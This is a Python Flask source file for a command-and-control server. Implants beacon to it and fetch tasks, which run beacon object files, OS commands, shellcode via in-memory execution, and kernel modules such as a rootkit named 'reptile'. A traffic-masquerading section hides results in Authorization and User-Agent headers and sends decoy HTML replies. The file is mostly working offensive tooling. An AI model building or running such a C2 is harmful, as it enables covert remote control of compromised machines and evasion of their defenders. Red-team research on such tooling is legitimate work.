from flask import Flask
from flask import request
from flask import send_from_directory
from flask import jsonify
import base64
import json
import binascii
import datetime
from struct import pack, calcsize
from collections import deque
import secrets
from enum import IntEnum

"""
Tasking an implant to execute 'uname' BOF with '-r' arguemnt provided:
curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
 "header" : "inline:z",
 "name" : "bof:uname",
 "argv" : "-r"
}'

Tasking an implant to execute 'uname' BOF with '-a' arguemnt and do not unload it after execution ('persist'):
curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
 "header" : "inline:z:persist",
 "name" : "bof:uname",
 "argv" : "-a"
}'

Structure of tasks (running BOF and passing the buffer content to it):
cmdData1 = {
	"header" : "thread:zb",
	"name" : "bof:udpScanner",
	"argv" : "8.8.8.8:53",
	"buffer" : "file:udpPayloads.txt",
};

Structure of tasks (running BOF ):
cmdData0 = {
	"header" : "callback:",
	"name" : "bof:kernelModLoader",
};

Structure of tasks (running OS commands):
cmdData2 = {
	"header" : "inline:z",
	"name" : "cmd:ls",
	"argv" : "-al",
};

Structure of tasks (running shellcodes):
cmdData3 = {
	"header" : "inline:b",
	"name" : "bin:memfdExecute",
	"buffer" : "file:executableToUpload.exe",
};

Structure of tasks (running kernel modules):
cmdData4 = {
	"header" : "inline:z",
	"name" : "mod:reptile",
	"argv" : "start",
};
"""

app = Flask(__name__)

bofsRootDir = "/bofs/"
kmodsRootDir = "/kmods/"

# Fifo queue of tasks to execute by implant
# POST request to /tasking endpoint adds (appendLeft) a new task to it
# GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
# dictionary stores JSON objects serialized to strings (json.dumps()) to deserialize it to the dict use: json.loads()
TaskFifo = deque()

# repository of implants that beaconed to us at least once
# dictionary stores dict() of implants' essential info. Dictionary uses 'SN' (implant's serial number) as its key.
#
# { "SN 1" : { "firstSeenAt": "",
#  "lastSeenAt": "",
#  "implantIdentity": "" },
# ...
# "SN N" : { "firstSeenAt": "",
#  "lastSeenAt": "",
#  "implantIdentity": "" }
# }
ImplantDict = dict()

# dictionary stores lists[] of taskIDs assigned to given implant's 'SN'. Dictionary uses 'SN' (implant's serial number) as its key.
ImplantTasksDict = dict()

# Repositories of:
# 1. tasks' input data (sent from operator)
# 2. tasks' output data (sent back from implant) that were successful
# 3. tasks' that failed (returned error code)
# stored under taskID keys 

# dict() of whole task sent by the operator is stored as a value:
InputDict = dict()

# string of output data is stored
OutputDict = dict()

# ret status code from BOF is stored
ErrorDict = dict()

### Network traffic evasion (C2 <-> implant)
class ImplantMessageType(IntEnum):
    GET_TASK = 1
    GET_RESOURCE = 2
    POST_RESULT = 3
    UNKNOWN = 4
    STAY_IDLE = 5

CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"

OUTPUT_RESULT_TASKID_HEADER =  "Authorization"

OUTPUT_RESULT_STATUS_CODE_HEADER =  "User-Agent"
def parseStatusCode(status_code):
    print("Status code: " + status_code)
    _, sc = status_code.split(':')
    return sc

def netMasquerade(Task, MsgType):

    if MsgType == ImplantMessageType.GET_TASK:

        csvString = ""
        for key, value in Task.items():
            #if key == "header": 
            #    value = value.replace(':', ',')

            csvString += value + ','

            print(csvString)

        return csvString

    elif MsgType == ImplantMessageType.GET_RESOURCE:
        # in this case Task is a Flask 'Response' object
        # https://flask.palletsprojects.com/en/stable/api/#flask.Response
        # TODO: compress and base64 encode resources

        return Task

    elif MsgType == ImplantMessageType.POST_RESULT:
        # return plausible HTML content
        return "<p>roger that</p>"

    elif MsgType == ImplantMessageType.STAY_IDLE:
        # understood, but nothing to do, stay idle
        return "<p>no taks</p>"

    elif MsgType == ImplantMessageType.UNKNOWN:
        # unrecognized request received
        return "<p>no such site</p>"


def netUnmasquerade(Task, MsgType):
    if MsgType == ImplantMessageType.GET_TASK:
        implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
        return implant_identity

    elif MsgType == ImplantMessageType.GET_RESOURCE:
        return Task

    elif MsgType == ImplantMessageType.POST_RESULT:
        task_status_hdr = request.headers.get(OUTPUT_RESULT_STATUS_CODE_HEADER)
        status_code = int(parseStatusCode(task_status_hdr))
        taskID = request.headers.get(OUTPUT_RESULT_TASKID_HEADER)
        if status_code == 0:
            data = base64.b64decode(request.get_data())
        else:
            data = ""

        return data, status_code, taskID
### end of Network traffic evasion (C2 <-> implant)


### Handling operator's requests from console (like adding new tasks and status display)
@app.route("/")
def main_page():
    return "<p>bofs repository</p>"

@app.route("/tasking", methods=['GET', 'POST'])
def addTask():

    if request.method == 'POST' and request.is_json:
        reqData = request.get_json()

        # check if all required fields are present (SN - implant serial number, name and header)
        if not 'SN' in reqData or not 'name' in reqData or not 'header' in reqData:
            return "<p>Badly formatted task!</p>"

        # add unique ID to the task (taskID)
        reqData['id'] = secrets.token_hex(8)
        taskID = reqData['id']
        serial_number = reqData['SN']

        # store task's input data for logging purposes
        InputDict[taskID] = reqData

        # assign generated taskID to specified implant 'SN' in ImplantTasksDict:
        if ImplantTasksDict.get(serial_number) is None:
            ImplantTasksDict[serial_number] = [taskID]
        else:
            ImplantTasksDict[serial_number].append(taskID)

        # convert JSON request to string and append it to TaskFifo 
        data = json.dumps(reqData)
        TaskFifo.appendleft(data) 
        return "<p>Consumed</p>"

    # handle GET:
    resp = []
    resp.append("<p>Pending tasks queue:</p>")

    for task in TaskFifo:
        t = json.loads(task)
        resp.append(t['id'] + '<br/>')

    resp.append("<p>Completed tasks:</p>")

    for key, taskEntry in InputDict.items():
        if key in OutputDict:
            resp.append('----------------------------------<br/>')
            resp.append('Task ID: ' + key + '<br/>')
            resp.append('Task raw input:<br/>')
            resp.append(taskEntry['SN'] + '<br/><br/>')
            resp.append('Task output:<br/>')
            resp.append(OutputDict[key].decode('utf-8') + '<br/>')
            resp.append('<br/>----------------------------------<br/><br/>')

    resp.append("<p>Failed tasks:</p>")

    for key, taskEntry in InputDict.items():
        if key in ErrorDict:
            resp.append('----------------------------------<br/>')
            resp.append('Task ID: ' + key + '<br/>')
            resp.append('Task raw input:<br/>')
            resp.append(taskEntry['SN'] + '<br/><br/>')
            resp.append('Task status code: ' + str(ErrorDict[key]) + '<br/>')
            resp.append('<br/>----------------------------------<br/><br/>')

    
    str_out = ''.join(resp)
    return str_out

class TaskStatus(IntEnum):
    UNKNOWN = 0
    PENDING = 1
    IN_PROGRESS = 2
    COMPLETED = 3
    FAILED = 4

def isTaskIDinTaskFifo(taskID):
    for task in TaskFifo:
        t = json.loads(task)
        if t['id'] == taskID:
            return True

    return False

# return task's current state
def getTaskState(taskID):
    taskStatus = TaskStatus.UNKNOWN

    if taskID in OutputDict:
        return taskStatus.COMPLETED
    elif taskID in ErrorDict:
        return taskStatus.FAILED
    elif isTaskIDinTaskFifo(taskID) == True:
        return taskStatus.PENDING
    elif taskID in InputDict and isTaskIDinTaskFifo(taskID) == False:
        return taskStatus.IN_PROGRESS
    else:
        return taskStatus.UNKNOWN

# return task's command line execution and (if task has completed) its output
def getTaskInOut(taskID):
    task_command = ""
    task_output = ""

    if taskID in InputDict:
        task_command = InputDict[taskID]['name']
        if 'argv' in InputDict[taskID]:
            task_command += " " + InputDict[taskID]['argv']
        if getTaskState(taskID) == TaskStatus.COMPLETED:
            task_output = OutputDict[taskID].decode('utf-8')

    return task_command, task_output


@app.route("/tasking/tasks", methods=['GET'])
def tasks():
    implantSN = request.args.get('implant')

    resp = []

    for key_iSN, taskList in ImplantTasksDict.items():
        if implantSN != None and implantSN != key_iSN:
            continue
        for task in taskList:
            task_state = getTaskState(task)
            task_command, _ = getTaskInOut(task)

            # get execution-mode from task's header
            exec_mode = ""
            try:
                exec_mode = InputDict[task]['header'].split(':')[0]
            except Exception as e:
                print(e)

            resp.append({
                'taskID' : task,
                'implantID' : key_iSN,
                'task_command' : task_command,
                'task_state' : task_state,
                'exec_mode' : exec_mode,
                })

    return jsonify(resp)

@app.route("/tasking/task", methods=['GET'])
def taskInfo():
    taskID = request.args.get('id')

    resp = []

    if taskID != "" and taskID in InputDict:
        task_command, task_output = getTaskInOut(taskID)
        task_state = getTaskState(taskID)

        # get execution-mode from task's header
        exec_mode = ""
        try:
            exec_mode = InputDict[taskID]['header'].split(':')[0]
        except Exception as e:
            print(e)

        if task_state == TaskStatus.FAILED:
            task_retstatus = ErrorDict[taskID]
        else:
            task_retstatus = 0

        resp.append({
            'taskID' : taskID,
            'task_command' : task_command,
            'task_output' : task_output,
            'task_retstatus' : task_retstatus,
            'task_state' : task_state,
            'exec_mode' : exec_mode,
            })

    return jsonify(resp)

@app.route("/tasking/implants", methods=['GET'])
def implants():

    implantSN = request.args.get('implant')

    # if implant=<implantSN> not provided return only essential data aobut all implants: ImplantDict
    if implantSN == None:
        return jsonify(ImplantDict)
    # in other case return status about running/pending/completed tasks and input and output of a lastly completed task
    else:
        pendingTasksN = 0
        inprogressTasksN = 0
        completedTasksN = 0
        errTasksN = 0
        last_taskID = ""
        last_task_command = ""
        last_task_output = ""
        errTasksN = 0

        # list of TaskIDs assigned to 'implantSN' implant
        # these tasks could be currently in one of the following states:
        # pending - present in TaskFifo and not in InputDict
        # assigned - present in InputDict and not in TaskFifo
        # completed (successfully) - present in OutputDict
        # failed (completed with an error) - present in ErrDict
        if implantSN in ImplantTasksDict:
            implant_tasks_list = ImplantTasksDict[implantSN]
        else:
            implant_tasks_list = []

        for t in implant_tasks_list:
            ts = getTaskState(t)
            if ts == TaskStatus.COMPLETED:
                completedTasksN += 1
                # record taskID of last completed task
                last_taskID = t
            elif ts == TaskStatus.FAILED:
                errTasksN += 1
            elif ts == TaskStatus.IN_PROGRESS:
                inprogressTasksN += 1
            else:
                pendingTasksN += 1

        # get last completed task's ID
        if completedTasksN > 0:
            last_task_command, last_task_output = getTaskInOut(last_taskID)

            print(type(last_task_output))

        resp = {
                'pendingTasksN' : pendingTasksN,
                'inprogressTasksN' : inprogressTasksN,
                'completedTasksN' : completedTasksN,
                'errTasksN' : errTasksN,
                'last_taskID' : last_taskID,
                'last_task_command' : last_task_command,
                'last_task_output' : last_task_output,
        }
        return jsonify(resp)


### end of Handling operator's requests from console (adding new tasks and status display)

### Handling implant's beaconing

# GET /endpoint - check if task is available (GET_TASK handler) - operator
# POST /endpoint - send in task's output data (POST_RESULT handler) - implant
@app.route("/endpoint", methods=['GET', 'POST'])
def heartbeat():
    # Flask request:
    # https://flask.palletsprojects.com/en/stable/api/#flask.Request

    if request.method == 'GET':
        msgType = ImplantMessageType.GET_TASK
    elif request.method == 'POST':
        msgType = ImplantMessageType.POST_RESULT
    else:
        msgType = ImplantMessageType.UNKNOWN

    # get implant's output data and add it to the output's store under 'taskID' key (POST_RESULT handler)
    if msgType == ImplantMessageType.POST_RESULT:
        data, status_code, taskID = netUnmasquerade(request, msgType)

        if status_code == 0:
            data = base64.b64decode(request.get_data())
            OutputDict[taskID] = data
        else:
            ErrorDict[taskID] = status_code

        return netMasquerade("", ImplantMessageType.POST_RESULT)

    # GET_TASK handler
    elif msgType == ImplantMessageType.GET_TASK:

        # get implant's identity (serial number - SN)
        implant_identity = netUnmasquerade(request, msgType)
        try:
            _, _, serial_number = implant_identity.split(':')
        except Exception as e:
            print(e)
            return netMasquerade("", ImplantMessageType.UNKNOWN)

        # TODO: validate also serial_number's exact format
        if not implant_identity:
            return netMasquerade("", ImplantMessageType.UNKNOWN)

        #
        # request looks legit, process it
        #

        # get current time
        t = datetime.datetime.now().strftime('%Y-%m-%d %T')

        # beaconing for the first time?
        if ImplantDict.get(serial_number) is None:
            implant_record = dict()
            implant_record['firstSeenAt'] = t # set firstSeenAt field
            implant_record['lastSeenAt'] = t # update lastSeenAt field
            implant_record['implantIdentity'] = implant_identity
            ImplantDict[serial_number] = implant_record
        else:
            ImplantDict[serial_number]['lastSeenAt'] = t # update lastSeenAt field
            ImplantDict[serial_number]['implantIdentity'] = implant_identity

        # stay idle, if there are no tasks to process at this time
        if len(TaskFifo) == 0:
            return netMasquerade("", ImplantMessageType.STAY_IDLE)

        # get tasking data from TaskFifo
        task = TaskFifo.pop()
        cmdData = json.loads(task) # deserialize to JSON

        # if popped task is meant for currently beaconing implant append it to ImplantTasksDict
        # and return it in the response
        if serial_number == cmdData['SN']:
            # postprocess task based on operator's input and calling implant's identity
            implantTask = constructImplantTask(cmdData, implant_identity) 

            # format / mask / obsfuscate / encode task before putting it on the wire
            return netMasquerade(implantTask, ImplantMessageType.GET_TASK)

        # else put task back to the deque and respond with STAY_IDLE
        else:
            data = json.dumps(cmdData)
            TaskFifo.append(data)
            return netMasquerade("", ImplantMessageType.STAY_IDLE)

    # unrecognized reguest, go away
    else:
        return netMasquerade("", ImplantMessageType.UNKNOWN)

def constructImplantTask(taskJSON, implant_identity):

    arch, os, serial_number = implant_identity.split(':')
    if arch == "x86_64":
        arch = "x64"
    if os == "windows":
        os = "coff"
    else:
        os = "elf"

    cmdData = taskJSON

    # request ID for identifying requests (task input data) with responses (tasks output)
    taskID = cmdData['id']

    # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
    Instruction = {
        "id": taskID,
        "name": cmdData['name'],
    }

    # we're dealing with BOF-stager's internal command execution here:
    if 'cmd:' in cmdData['name']:
        return Instruction

    # we're dealing with kernel module loading here:
    if 'kmod:' in cmdData['name']:
        # prepare instruction's: 'path' field for kernel modules
        _, name = cmdData['name'].split(':')
        kmodHttpPath = kmodsRootDir + name + ".ko"
        Instruction['path'] = kmodHttpPath
        return Instruction

    # we're dealing with kernel module unloading here:
    if 'kmodrm:' in cmdData['name']:
        return Instruction

    # we're dealing with BOF execution task, so let's:
    # 1. prepare path/URI for the BOF in case when downloading it will be needed
    # 2. calculate requested BOF's hash
    # 3. add bof_hash to the header field
    # 4. if 'persist' is in the header, put it at the last field of the header
    if 'bof:' in cmdData['name']:
        # prepare instruction's: 'path' field for bofs
        _, name = cmdData['name'].split(':')
        bofHttpPath = bofsRootDir + name + "." + os + "." + arch + ".o"
        Instruction['path'] = bofHttpPath
        bofLocalPath = bofHttpPath.lstrip('/')

        # calculate BOF's hash
        with open(bofLocalPath, 'rb') as f:
            bof_hash = format(abs(hash(f.read())), 'x')

        header = cmdData['header']

        # we're swapping hash with "persistent" (if provided) to have the latter one at the end of the header
        if 'persist' in header:
            # replace 'persist' for bof_hash in header and then append 'persist'
            header = header.replace("persist", bof_hash)
            Instruction['header'] = header + ":persist"
        else:
            # append hash to the header:
            Instruction['header'] = header + ":" + bof_hash

    # get args specification possible values: iszZb
    args_spec = header.split(':')[1]

    # skip further processing if no arguments were provided
    if args_spec == "":
        return Instruction 

    if 'argv' not in cmdData:
        return Instruction 

    # prepare cmdData/Instruction for BOF-stager by iterating over 'argv' and inspecting args_spec
    argv = cmdData['argv'].split(' ')
    new_argv = ""
    i = 0
    buf_number = 0

    if len(argv) != len(args_spec):
        print("argv and args_spec mismatched length!")

    while i < len(argv):
        print(argv[i])
        print(args_spec[i])
        
        if len(new_argv) > 0:
            new_argv += " "

        # zero-terminated string
        if args_spec[i] == 'z':
            argv[i] = "z:" + argv[i]
            new_argv += argv[i]
        # integer
        elif args_spec[i] == 'i':
            argv[i] = "i:" + argv[i]
            new_argv += argv[i]
        # short integer
        elif args_spec[i] == 's':
            argv[i] = "s:" + argv[i]
            new_argv += argv[i]
        elif args_spec[i] == 'b':
            # prepare Instruction's field name
            field_name = "buffer" + str(buf_number)
            buf_number += 1
 
            # prepare Instruction's field content
            if 'file:' in argv[i]:
                _, path = argv[i].split(':')
                with open(path, 'rb') as f:
                    Instruction[field_name] = base64.b64encode(f.read()).decode('utf-8')
            else:
                # field is expected to be already base64 encoded
                Instruction[field_name] = argv[i]

            new_argv += str(field_name)

        i += 1

    print("new_argv: " + new_argv)

    # glue together all argv[i]'s and base64 encode it before sending
    Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')

    # return Implant's Instruction for execution
    return Instruction

### end of Handling implant's beaconing


### Resource serving endpoints
@app.route(bofsRootDir + '<path:path>')
def send_report(path):
    resp = send_from_directory('bofs', path, mimetype='application/octet-stream')
    return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)

@app.route(kmodsRootDir + '<path:path>')
def send_kmod(path):
    resp = send_from_directory('kmods', path, mimetype='application/octet-stream')
    return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)
### end of Resource serving endpoints


if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8000,debug=True)
